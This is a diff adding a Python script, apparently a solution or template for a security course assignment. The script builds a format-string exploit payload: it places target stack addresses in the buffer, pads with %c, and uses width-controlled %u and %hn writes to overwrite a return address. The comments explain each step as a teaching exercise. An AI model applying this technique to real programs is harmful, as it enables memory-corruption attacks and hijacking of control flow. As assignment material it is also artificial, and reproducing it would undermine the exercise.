@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+##############################################################################
+# We recommend fully reading the spec before attempting this question!
+##############################################################################
+
+payload = ''
+
+##############################################################################
+# The first thing we need to put into our buffer is what we'll consume down
+# below, in each call to %hn: memory addresses that point to the address that
+# we want to overwrite with each use of %hn.
+##############################################################################
+
+payload += 'A' * 4   # Hint: Word 0 of buffer (consumed by %__u)
+payload += '\xac\xd9\xff\xff'   # Hint: Word 1 of buffer (consumed by %hn)
+
+payload += 'A' * 4   # Hint: Word 2 of buffer (consumed by %__u)
+payload += '\xae\xd9\xff\xff'    # Hint: Word 3 of buffer (consumed by %hn)
+
+##############################################################################
+# Before we dive into the %hn, we need to make sure we bump our printf argument
+# pointer up to a point where we have write access to (e.g. somewhere in our
+# buffer). We can use the harmless %c to work our way up the stack. After all
+# of these %c's are consumed, we should expect our argument pointer to point
+# to the first thing in our buffer (as noted above, "Word 0").
+##############################################################################
+
+payload += '%c' * 15
+
+##############################################################################
+# Now, we're ready to dive into the %hn's. Before each %hn, we need to make sure
+# we've printed the total number of bytes correctly; that's what the %__u is
+# for. Calculate the number of "remaining" bytes to print by subtracting the
+# target value that we want to print from the total number of bytes we've
+# printed so far in the exploit. Note that each %c prints one byte.
+##############################################################################
+
+FIRST_HALF =  0xffff   # The two most significant bytes of an address
+SECOND_HALF = 0xdbf0   # The two least significant bytes of an address
+
+payload += '%' + str(SECOND_HALF - 31) + 'u'
+payload += '%hn'
+
+payload += '%' + str(FIRST_HALF - SECOND_HALF) + 'u'
+payload += '%hn'
+
+print(payload + '\n')
